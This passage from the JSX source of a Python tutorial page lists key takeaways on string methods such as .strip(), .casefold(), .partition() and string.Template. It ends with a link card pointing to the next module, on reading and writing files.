        '.strip() removes all leading/trailing whitespace (spaces, tabs, newlines) by default, or an explicit set of characters when given an argument.',
        'Always normalise case (.lower() or the more thorough .casefold()) and strip whitespace before comparing human-entered text — invisible formatting differences are a constant source of "why doesn\'t this match" bugs.',
        '.ljust(), .rjust(), .center(), and .zfill() produce fixed-width, aligned output for reports and IDs; f-string format specifiers handle more advanced formatting like thousands separators.',
        'textwrap.wrap()/.fill() wrap long text at word boundaries, unlike naive fixed-length slicing, which can cut a word in half.',
        'F-strings are safe because you write the template as literal source code. string.Template is the safe choice specifically when the template text itself comes from an untrusted source, since it cannot evaluate expressions or execute code.',
        '.partition(sep) splits only on the first occurrence of a delimiter, returning a reliable 3-tuple — safer than .split(sep) for key=value parsing when the value might itself contain the delimiter.',
        'Real-world text parsing is rarely one clean step — it is a short, deliberate sequence of cleaning, splitting, and normalising, each handling one specific kind of messiness.',
      ]} />

      {/* ── Next Module CTA ── */}
      <div style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderRadius: 10, padding: '24px', marginTop: 40 }}>
        <p style={{ fontSize: 10, color: 'var(--muted)', letterSpacing: '.12em', textTransform: 'uppercase', fontFamily: 'var(--font-mono)', fontWeight: 700, margin: '0 0 10px' }}>
          What comes next
        </p>
        <p style={{ fontSize: 15, color: 'var(--text)', lineHeight: 1.85, margin: '0 0 20px' }}>
          Module 15 moves from text you already have in memory to text (and binary data) that lives on
          disk — file handles, context managers, read/write modes, and the mistakes that cause silent
          data loss.
        </p>
        <Link href="/learn/python/reading-writing-files" style={{ background: C, color: '#000', padding: '11px 24px', borderRadius: 7, fontWeight: 700, fontSize: 13, textDecoration: 'none', display: 'inline-block' }}>
          Module 15 → Reading &amp; Writing Files
        </Link>
      </div>
    </LearnLayout>
  )
}